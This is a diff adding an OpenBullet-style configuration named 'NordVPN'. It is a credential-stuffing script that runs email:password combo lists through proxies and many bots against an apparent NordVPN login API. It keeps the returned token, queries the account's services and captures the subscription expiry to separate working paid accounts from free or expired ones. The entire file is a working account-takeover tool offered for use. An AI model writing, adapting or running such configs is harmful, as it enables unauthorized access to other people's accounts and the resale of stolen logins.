@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "NordVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-22T14:34:50.9855457+11:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"message\":\"Unauthorized\"" 
+  KEYCHAIN Success OR 
+    KEY "\"user_id\":" 
+
+#Token PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "Token" 
+
+#Encode FUNCTION Base64Encode "token:<Token>" -> VAR "Encodetoken" 
+
+#Request REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <Encodetoken>" 
+
+#Expiration PARSE "<SOURCE>" LR "\",\"expires_at\":\"" " " -> CAP "Expiration Date" 
+
+#DateToUnix FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expiration Date>" -> VAR "Waktu1" 
+
+#CurrentUnix FUNCTION CurrentUnixTime -> VAR "Waktu2" 
+
+#UnixToDate FUNCTION UnixTimeToDate "<Waktu2>" -> VAR "Waktu" 
+
+#Check_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "<Waktu2>" LessThan "<Waktu1>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Waktu2>" GreaterThan "<Waktu1>" 
+
